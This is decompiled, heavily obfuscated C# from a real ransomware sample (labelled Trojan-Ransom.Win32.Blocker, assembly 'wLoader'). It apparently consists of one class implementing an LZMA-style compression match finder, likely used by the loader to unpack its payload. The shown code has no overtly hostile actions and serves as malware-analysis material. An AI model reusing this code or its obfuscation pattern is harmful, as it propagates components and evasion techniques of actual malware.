// Decompiled with JetBrains decompiler
// Type: ?4?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 601E9F23-A239-4CA4-BCF6-5BB65F85A0DA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.biqw-00a129d49d9d6af2a869f53ab2db7d80f4313e2b391d30ed8e02a96f59aa0cb4.exe

using \u003F9\u003F;
using System;
using System.IO;

public sealed class \u003F4\u003F : \u003F2\u003F, \u003F3\u003F, \u003F5\u003F
{
  private uint \u003F1\u003F;
  private uint \u003F2\u003F;
  private uint \u003F3\u003F;
  private uint \u003F5\u003F;
  private uint[] \u003F4\u003F;
  private uint[] \u003F6\u003F;
  private uint[] \u003F7\u003F;
  private uint[] \u003F89\u003F;
  private uint \u003F90\u003F = (uint) byte.MaxValue;
  private bool \u003F10\u003F = true;
  private bool \u003F13\u003F;
  private new uint \u003F12\u003F = 1024;
  private uint \u003F14\u003F;
  private uint \u003F91\u003F = 4;
  private uint \u003F15\u003F = 1048576;

  public void \u003F1\u003F(int _param1, bool _param2)
  {
    this.\u003F10\u003F = _param1 > 2;
    this.\u003F13\u003F = _param2;
    if (!this.\u003F10\u003F)
    {
      this.\u003F14\u003F = 2U;
      this.\u003F91\u003F = 2U;
      this.\u003F15\u003F = 65536U;
    }
    else
    {
      this.\u003F12\u003F = 1024U;
      this.\u003F14\u003F = 0U;
      this.\u003F91\u003F = 4U;
      this.\u003F15\u003F = this.\u003F13\u003F ? 8388608U : 1048576U;
    }
  }

  private uint \u003F1\u003F(uint _param1, out uint _param2, out uint _param3)
  {
    uint num1 = \u003F1\u003F.\u003F1\u003F[(int) base.\u003F1\u003F[(IntPtr) _param1]] ^ (uint) base.\u003F1\u003F[(IntPtr) (_param1 + 1U)];
    _param2 = num1 & this.\u003F12\u003F - 1U;
    int num2 = (int) num1;
    if (false)
      goto label_4;
    else
      goto label_7;
label_1:
    int num3;
    uint num4 = (uint) num3;
    _param3 = num4 & 262143U;
    num3 = (int) num4;
label_2:
    int num5 = (int) \u003F1\u003F.\u003F1\u003F[(int) base.\u003F1\u003F[(IntPtr) (_param1 + 3U)]];
    num2 = num3;
label_3:
    int num6 = 5;
    int num7;
    int num8;
    if (num6 == 0)
    {
      num8 = num6;
      num7 = num5;
      goto label_6;
    }
    else
    {
      int num9 = num5 << num6;
      num2 ^= num9;
    }
label_4:
    num7 = (int) this.\u003F15\u003F;
label_5:
    num8 = 1;
label_6:
    num5 = num7 - num8;
    if (true)
    {
      num3 = num2 & num5;
      if (true)
      {
        if (true)
          return (uint) num3;
        goto label_1;
      }
      else
        goto label_2;
    }
    else
      goto label_3;
label_7:
    int num10 = (int) base.\u003F1\u003F[(IntPtr) (_param1 + 2U)];
    if (false)
    {
      num7 = num10;
      goto label_5;
    }
    else
    {
      int num11 = num10 << 8;
      num3 = num2 ^ num11;
      goto label_1;
    }
  }

  private uint \u003F1\u003F(uint _param1)
  {
    int num1 = (int) base.\u003F1\u003F[(IntPtr) _param1];
    int num2;
    while (true)
    {
      int num3 = (int) base.\u003F1\u003F[(IntPtr) (_param1 + 1U)];
      do
      {
        if (true)
          goto label_4;
label_2:
        continue;
label_4:
        num3 <<= 8;
        goto label_2;
      }
      while (false);
      num2 = num1 ^ num3;
      if (false)
        num1 = num2;
      else if (false)
        num1 = num2;
      else
        break;
    }
    return (uint) num2;
  }

  public void \u0005\u2009\u2001\u0002(Stream _param1)
  {
    Stream stream = _param1;
    if (true)
      goto label_9;
label_1:
    if (true)
      goto label_14;
label_3:
    uint index;
    do
    {
      for (; index < this.\u003F12\u003F; ++index)
        this.\u003F7\u003F[(IntPtr) index] = 0U;
      if (false)
        goto label_13;
    }
    while (false);
    int num1 = 0;
    int num2;
    if (num1 != 0)
    {
      num2 = num1;
      goto label_7;
    }
    else
    {
      index = (uint) num1;
      goto label_6;
    }
label_5:
    int num3;
    int num4;
    index = (uint) (num3 + num4);
label_6:
    num2 = (int) index;
label_7:
    if ((uint) num2 < 262144U)
    {
      this.\u003F89\u003F[(IntPtr) index] = 0U;
      int num5 = (int) index;
      num4 = 1;
      num3 = num5;
      goto label_5;
    }
label_8:
    this.\u003F1\u003F = 0U;
    this.\u003F1\u003F(-1);
    return;
label_10:
    int num6;
    index = (uint) num6;
label_13:
    while (true)
    {
      num3 = (int) index;
      num4 = (int) this.\u003F15\u003F;
      if (true)
      {
        if ((uint) num3 < (uint) num4)
        {
          this.\u003F6\u003F[(IntPtr) index] = 0U;
          num6 = (int) index + 1;
          if (true)
            index = (uint) num6;
          else
            goto label_10;
        }
        else
          break;
      }
      else
        goto label_5;
    }
    if (this.\u003F10\u003F)
    {
      index = 0U;
      goto label_3;
    }
    else
      goto label_8;
label_14:
    num6 = 0;
    goto label_10;
label_9:
    this.\u003F27\u003F(stream);
    goto label_1;
  }

  public void \u0005\u2009\u2001\u0002() => this.\u003F27\u003F();

  public void \u0005\u2009\u2001\u0003()
  {
label_0:
    ++this.\u003F1\u003F;
    if (false)
      goto label_5;
    else
      goto label_4;
label_1:
    int num1;
    int maxValue;
    if (true)
    {
      if ((uint) num1 < (uint) maxValue)
        goto label_6;
      else
        goto label_5;
    }
label_2:
    if (maxValue != 0)
    {
      if (num1 == maxValue)
        goto label_11;
label_3:
      if (true)
        return;
      goto label_7;
label_11:
      if (true)
      {
        this.\u003F1\u003F();
        goto label_3;
      }
      else
        goto label_0;
    }
    else
      goto label_1;
label_4:
    int num2 = (int) this.\u003F1\u003F;
    maxValue = (int) this.\u003F2\u003F;
    num1 = num2;
    goto label_1;
label_5:
    this.\u003F1\u003F = 0U;
label_6:
    this.\u003F28\u003F();
label_7:
    num1 = (int) base.\u003F89\u003F;
    maxValue = int.MaxValue;
    goto label_2;
  }

  public byte \u0005\u2009\u2001\u0002(int _param1) => this.\u003F27\u003F(_param1);

  public uint \u0005\u2009\u2001\u0002(int _param1, uint _param2, uint _param3) => this.\u003F27\u003F(_param1, _param2, _param3);

  public uint \u0005\u2009\u2001\u0002() => this.\u003F27\u003F();

  public void \u0008\u2009\u2001\u0002(uint _param1, uint _param2, uint _param3, uint _param4)
  {
    int num1 = (int) _param1 + (int) _param2;
    int num2;
    int num3;
    if (true)
    {
      int num4 = (int) _param3;
      int num5 = num1 + num4;
      int num6 = (int) _param4;
      if (true)
      {
        num1 = (int) ((uint) (num5 + num6) / 2U) + 256;
      }
      else
      {
        num3 = num6;
        num2 = num5;
        goto label_6;
      }
    }
    uint num7 = (uint) num1;
    this.\u003F4\u003F = (uint[]) null;
    this.\u003F6\u003F = (uint[]) null;
    this.\u003F7\u003F = (uint[]) null;
    this.\u003F89\u003F = (uint[]) null;
    this.\u003F1\u003F(_param1 + _param2, _param3 + _param4, num7);
    num2 = (int) base.\u003F7\u003F + 256;
    num3 = int.MaxValue;
label_6:
    if ((uint) num2 > (uint) num3)
      throw new Exception();
    this.\u003F3\u003F = _param1;
    this.\u003F5\u003F = _param3;
    this.\u003F2\u003F = _param1 + 1U;
    this.\u003F4\u003F = new uint[(IntPtr) (this.\u003F2\u003F * 2U)];
    this.\u003F6\u003F = new uint[(IntPtr) this.\u003F15\u003F];
    if (!this.\u003F10\u003F)
      return;
    this.\u003F7\u003F = new uint[(IntPtr) this.\u003F12\u003F];
    this.\u003F89\u003F = new uint[new IntPtr(262144)];
  }

  public uint \u0008\u2009\u2001\u0002(uint[] _param1)
  {
    if (base.\u003F89\u003F + this.\u003F5\u003F > base.\u003F12\u003F)
      goto label_30;
    else
      goto label_29;
label_1:
    int num1;
    return num1 != 0 ? (uint) num1 : (uint) num1;
label_2:
    uint num2 = base.\u003F89\u003F > this.\u003F3\u003F ? base.\u003F89\u003F - this.\u003F3\u003F : 1U;
    uint index1 = base.\u003F6\u003F + base.\u003F89\u003F;
    uint num3 = 0;
    uint index2 = 0;
label_3:
    uint index3 = 0;
    int num4 = this.\u003F10\u003F ? 1 : 0;
label_34:
    uint index4 = num4 == 0 ? this.\u003F1\u003F(index1) : this.\u003F1\u003F(index1, out index2, out index3);
    uint num5 = this.\u003F6\u003F[(IntPtr) index4];
    int num6 = 0;
    uint num7;
    int num8;
    if (num6 != 0)
    {
      num8 = num6;
      goto label_31;
    }
    else
    {
      int num9 = 0;
      if (num9 == 0)
        goto label_36;
label_6:
      uint num10 = (uint) (num9 - 1);
      num3 = 3U;
      bool flag1 = true;
      bool flag2;
      uint num11;
      if (!flag2)
      {
        num11 = num10;
        flag2 = true;
      }
      else if (num10 < num11)
        num11 = num10;
label_8:
      this.\u003F6\u003F[(IntPtr) index4] = base.\u003F89\u003F;
      if (num5 >= num2)
      {
        uint index5 = (uint) (((int) this.\u003F1\u003F << 1) + 1);
        uint index6 = this.\u003F1\u003F << 1;
        int num12;
        uint val2 = (uint) (num12 = (int) this.\u003F14\u003F);
        uint val1 = (uint) num12;
        uint index7 = (uint) num12;
        _param1[(IntPtr) index7] = (uint) ((int) base.\u003F89\u003F - (int) num5 - 1);
        uint num13 = this.\u003F90\u003F;
label_23:
        int num14 = (int) num13;
        int num15;
        for (int index8 = 0; (uint) num14 > (uint) index8; num14 = num15)
        {
          if (true)
          {
            uint num16 = base.\u003F6\u003F + num5;
            uint num17 = Math.Min(val1, val2);
            while (num17 < num7 && (int) base.\u003F1\u003F[(IntPtr) (num16 + num17)] == (int) base.\u003F1\u003F[(IntPtr) (index1 + num17)])
              ++num17;
            num15 = (int) base.\u003F89\u003F;
            int num18 = (int) num5;
            if (true)
            {
              uint num19 = (uint) (num15 - num18);
              while (num17 > index7)
                _param1[(IntPtr) ++index7] = num19 - 1U;
              uint index9 = (uint) ((num19 <= this.\u003F1\u003F ? (int) this.\u003F1\u003F - (int) num19 : (int) this.\u003F1\u003F - (int) num19 + (int) this.\u003F2\u003F) << 1);
              if ((int) num17 == (int) num7)
              {
                if (num17 >= this.\u003F5\u003F)
                {
                  this.\u003F4\u003F[(IntPtr) index5] = this.\u003F4\u003F[(IntPtr) (index9 + 1U)];
                  this.\u003F4\u003F[(IntPtr) index6] = this.\u003F4\u003F[(IntPtr) index9];
                  if (this.\u003F10\u003F)
                    goto label_58;
label_21:
                  int num20 = (int) index7;
                  if (true)
                    return (uint) num20;
                  num4 = num20;
                  goto label_34;
label_58:
                  if (flag2 && num11 < _param1[2])
                    goto label_59;
label_20:
                  if (flag1 && num10 < _param1[3])
                  {
                    _param1[3] = num10;
                    goto label_21;
                  }
                  else
                    goto label_21;
label_59:
                  _param1[2] = num11;
                  goto label_20;
                }
                else
                {
                  this.\u003F4\u003F[(IntPtr) index5] = num5;
                  index5 = index9;
                  num5 = this.\u003F4\u003F[(IntPtr) index5];
                  if (num17 > val2)
                    val2 = num17;
                }
              }
              else
                goto label_52;
label_22:
              if (num5 >= num2)
              {
                --num13;
                goto label_23;
              }
              else
                break;
label_52:
              if ((int) base.\u003F1\u003F[(IntPtr) (num16 + num17)] >= (int) base.\u003F1\u003F[(IntPtr) (index1 + num17)])
              {
                this.\u003F4\u003F[(IntPtr) index5] = num5;
                index5 = index9;
                num5 = this.\u003F4\u003F[(IntPtr) index5];
                if (num17 > val2)
                {
                  val2 = num17;
                  goto label_22;
                }
                else
                  goto label_22;
              }
              else
              {
                this.\u003F4\u003F[(IntPtr) index6] = num5;
                index6 = index9 + 1U;
                num5 = this.\u003F4\u003F[(IntPtr) index6];
                if (num17 > val1)
                {
                  val1 = num17;
                  goto label_22;
                }
                else
                  goto label_22;
              }
            }
            else
              index8 = num18;
          }
          else
            goto label_30;
        }
        this.\u003F4\u003F[(IntPtr) index5] = 0U;
        this.\u003F4\u003F[(IntPtr) index6] = 0U;
        if (this.\u003F10\u003F)
          goto label_64;
label_28:
        return index7;
label_64:
        if (flag2)
          goto label_65;
label_26:
        if (flag1)
        {
          if (index7 >= 3U)
          {
            if (num10 < _param1[3])
            {
              _param1[3] = num10;
              goto label_28;
            }
            else
              goto label_28;
          }
          else
          {
            _param1[3] = num10;
            index7 = 3U;
            goto label_28;
          }
        }
        else
          goto label_28;
label_65:
        if (index7 >= 2U)
        {
          if (num11 < _param1[2])
          {
            _param1[2] = num11;
            goto label_26;
          }
          else
            goto label_26;
        }
        else
        {
          _param1[2] = num11;
          index7 = 2U;
          goto label_26;
        }
      }
      else
      {
        this.\u003F4\u003F[(IntPtr) (this.\u003F1\u003F << 1)] = 0U;
        this.\u003F4\u003F[(IntPtr) (uint) (((int) this.\u003F1\u003F << 1) + 1)] = 0U;
        if (this.\u003F10\u003F)
          goto label_47;
label_9:
        return num3;
label_47:
        _param1[2] = num11;
        _param1[3] = num10;
        goto label_9;
      }
label_36:
      if (true)
      {
        num1 = 0;
        if (num1 == 0)
        {
          num11 = (uint) num1;
          num10 = 0U;
          flag2 = false;
          flag1 = false;
          if (this.\u003F10\u003F)
          {
            uint num21 = this.\u003F7\u003F[(IntPtr) index2];
            uint num22;
            do
            {
              num22 = this.\u003F89\u003F[(IntPtr) index3];
              this.\u003F7\u003F[(IntPtr) index2] = base.\u003F89\u003F;
              if (num21 >= num2 && (int) base.\u003F1\u003F[(IntPtr) (base.\u003F6\u003F + num21)] == (int) base.\u003F1\u003F[(IntPtr) index1])
                goto label_40;
label_5:
              this.\u003F89\u003F[(IntPtr) index3] = base.\u003F89\u003F;
              if (num22 >= num2)
                continue;
              goto label_8;
label_40:
              num11 = (uint) ((int) base.\u003F89\u003F - (int) num21 - 1);
              num3 = 2U;
              flag2 = true;
              goto label_5;
            }
            while (false);
            if ((int) base.\u003F1\u003F[(IntPtr) (base.\u003F6\u003F + num22)] == (int) base.\u003F1\u003F[(IntPtr) index1])
            {
              num9 = (int) base.\u003F89\u003F - (int) num22;
              goto label_6;
            }
            else
              goto label_8;
          }
          else
            goto label_8;
        }
        else
          goto label_1;
      }
      else
        goto label_3;
    }
label_29:
    num7 = this.\u003F5\u003F;
    goto label_2;
label_30:
    num8 = (int) base.\u003F12\u003F - (int) base.\u003F89\u003F;
label_31:
    num7 = (uint) num8;
    if (num7 < this.\u003F91\u003F)
    {
      num1 = 0;
      goto label_1;
    }
    else
      goto label_2;
  }

  public void \u0008\u2009\u2001\u0002()
  {
    int num1 = (int) base.\u003F89\u003F + (int) this.\u003F5\u003F;
    if (false)
      goto label_9;
    else
      goto label_21;
label_1:
    if (true)
      return;
    goto label_14;
label_5:
    int num2;
    uint num3 = (uint) num2;
    if (this.\u003F10\u003F)
      goto label_25;
label_6:
    uint index1;
    this.\u003F6\u003F[(IntPtr) index1] = base.\u003F89\u003F;
    uint num4;
    uint index2;
    uint index3;
    uint val2;
    uint val1;
    uint num5;
    if (num3 >= num4)
    {
      index2 = (uint) (((int) this.\u003F1\u003F << 1) + 1);
      index3 = this.\u003F1\u003F << 1;
      val1 = val2 = this.\u003F14\u003F;
      num5 = this.\u003F90\u003F;
      goto label_19;
    }
    else
    {
      this.\u003F4\u003F[(IntPtr) (this.\u003F1\u003F << 1)] = 0U;
      this.\u003F4\u003F[(IntPtr) (uint) (((int) this.\u003F1\u003F << 1) + 1)] = 0U;
      return;
    }
label_25:
    uint index4;
    int num6 = (int) this.\u003F7\u003F[(IntPtr) index4];
    uint index5;
    int num7 = (int) this.\u003F89\u003F[(IntPtr) index5];
    this.\u003F7\u003F[(IntPtr) index4] = base.\u003F89\u003F;
    this.\u003F89\u003F[(IntPtr) index5] = base.\u003F89\u003F;
    goto label_6;
label_9:
    uint num8 = (uint) num1;
label_10:
    int num9 = (int) num8;
    uint num10;
    uint num11;
    uint num12;
    int num13;
    while (true)
    {
      int num14 = (int) num12;
      if ((uint) num9 >= (uint) num14 || (int) base.\u003F1\u003F[(IntPtr) (num11 + num8)] != (int) base.\u003F1\u003F[(IntPtr) (num10 + num8)])
      {
        num2 = (int) base.\u003F89\u003F;
        if (true)
        {
          int num15 = (int) num3;
          num13 = num2 - num15;
          if (false)
            num9 = num13;
          else
            goto label_30;
        }
        else
          goto label_5;
      }
      else
        break;
    }
    num1 = (int) num8 + 1;
    goto label_9;
label_30:
    uint num16 = (uint) num13;
    int num17 = (num16 <= this.\u003F1\u003F ? (int) this.\u003F1\u003F - (int) num16 : (int) this.\u003F1\u003F - (int) num16 + (int) this.\u003F2\u003F) << 1;
label_13:
    uint index6 = (uint) num17;
    if ((int) num8 == (int) num12)
    {
      if (num8 >= this.\u003F5\u003F)
      {
        this.\u003F4\u003F[(IntPtr) index2] = this.\u003F4\u003F[(IntPtr) (index6 + 1U)];
        this.\u003F4\u003F[(IntPtr) index3] = this.\u003F4\u003F[(IntPtr) index6];
        return;
      }
      this.\u003F4\u003F[(IntPtr) index2] = num3;
      index2 = index6;
      num3 = this.\u003F4\u003F[(IntPtr) index2];
      if (num8 > val2)
      {
        val2 = num8;
        goto label_18;
      }
      else
        goto label_18;
    }
    else if ((int) base.\u003F1\u003F[(IntPtr) (num11 + num8)] >= (int) base.\u003F1\u003F[(IntPtr) (num10 + num8)])
    {
      this.\u003F4\u003F[(IntPtr) index2] = num3;
      index2 = index6;
      num3 = this.\u003F4\u003F[(IntPtr) index2];
      if (num8 > val2)
      {
        val2 = num8;
        goto label_18;
      }
      else
        goto label_18;
    }
    else
      this.\u003F4\u003F[(IntPtr) index3] = num3;
label_14:
    index3 = index6 + 1U;
    if (true)
    {
      num3 = this.\u003F4\u003F[(IntPtr) index3];
      if (true)
      {
        if (num8 > val1)
          val1 = num8;
      }
      else
        goto label_1;
    }
    else
      goto label_10;
label_18:
    if (num3 >= num4)
      --num5;
    else
      goto label_20;
label_19:
    if (num5 > 0U)
    {
      num17 = (int) base.\u003F6\u003F + (int) num3;
      if (true)
      {
        num11 = (uint) num17;
        num8 = Math.Min(val1, val2);
        goto label_10;
      }
      else
        goto label_13;
    }
label_20:
    this.\u003F4\u003F[(IntPtr) index2] = 0U;
    this.\u003F4\u003F[(IntPtr) index3] = 0U;
    return;
label_21:
    int num18 = (int) base.\u003F12\u003F;
    if ((uint) num1 > (uint) num18)
      goto label_23;
    else
      goto label_22;
label_2:
    num4 = base.\u003F89\u003F > this.\u003F3\u003F ? base.\u003F89\u003F - this.\u003F3\u003F : 1U;
    num10 = base.\u003F6\u003F + base.\u003F89\u003F;
    index4 = 0U;
    index5 = 0U;
    if (this.\u003F10\u003F)
      goto label_24;
label_3:
    index1 = this.\u003F1\u003F(num10);
label_4:
    num2 = (int) this.\u003F6\u003F[(IntPtr) index1];
    goto label_5;
label_24:
    index1 = this.\u003F1\u003F(num10, out index4, out index5);
    if (false)
      goto label_3;
    else
      goto label_4;
label_22:
    num12 = this.\u003F5\u003F;
    goto label_2;
label_23:
    num12 = base.\u003F12\u003F - base.\u003F89\u003F;
    if (num12 >= this.\u003F91\u003F)
      goto label_2;
    else
      goto label_1;
  }

  private void \u003F1\u003F(uint[] _param1, uint _param2, uint _param3)
  {
    uint index = 0;
    while (true)
    {
      if (false)
        goto label_6;
      else
        goto label_10;
label_1:
      int num1;
      int num2;
      uint num3 = (uint) (num1 - num2);
label_2:
      _param1[(IntPtr) index] = num3;
      int num4 = (int) index;
      if (true)
        ++num4;
      else
        goto label_5;
label_3:
      index = (uint) num4;
      continue;
label_5:
      if (true)
      {
        int num5 = (int) _param2;
        if (false)
        {
          num2 = num5;
          num1 = num4;
          goto label_1;
        }
        else if (false)
        {
          num2 = num5;
          num1 = num4;
          goto label_1;
        }
        else if ((uint) num4 >= (uint) num5)
          break;
      }
      else
        goto label_3;
label_6:
      uint num6 = _param1[(IntPtr) index];
      if (num6 > _param3)
      {
        num1 = (int) num6;
        num2 = (int) _param3;
        goto label_1;
      }
      else
      {
        num3 = 0U;
        goto label_2;
      }
label_10:
      num4 = (int) index;
      goto label_5;
    }
  }

  private void \u003F1\u003F()
  {
    int num1 = (int) base.\u003F89\u003F;
    int num2 = (int) this.\u003F3\u003F;
    uint num3;
    while (true)
    {
      uint num4 = (uint) (num1 - num2);
      int num5;
      int num6;
      do
      {
        do
        {
          num5 = (int) num4;
          int num7;
          while (true)
          {
            num6 = 1;
            if (num6 != 0)
            {
              num7 = num5 - num6;
              if (false)
                num5 = num7;
              else
                break;
            }
            else
              goto label_6;
          }
          num3 = (uint) num7;
        }
        while (false);
        this.\u003F1\u003F(this.\u003F4\u003F, this.\u003F2\u003F * 2U, num3);
        do
        {
          this.\u003F1\u003F(this.\u003F6\u003F, this.\u003F15\u003F, num3);
          if (this.\u003F10\u003F)
            goto label_10;
label_5:
          continue;
label_10:
          this.\u003F1\u003F(this.\u003F7\u003F, this.\u003F12\u003F, num3);
          this.\u003F1\u003F(this.\u003F89\u003F, 262144U, num3);
          goto label_5;
        }
        while (false);
      }
      while (false);
      break;
label_6:
      num2 = num6;
      num1 = num5;
    }
    this.\u003F1\u003F((int) num3);
  }

  public void \u003F1\u003F(uint _param1) => this.\u003F90\u003F = _param1;
}
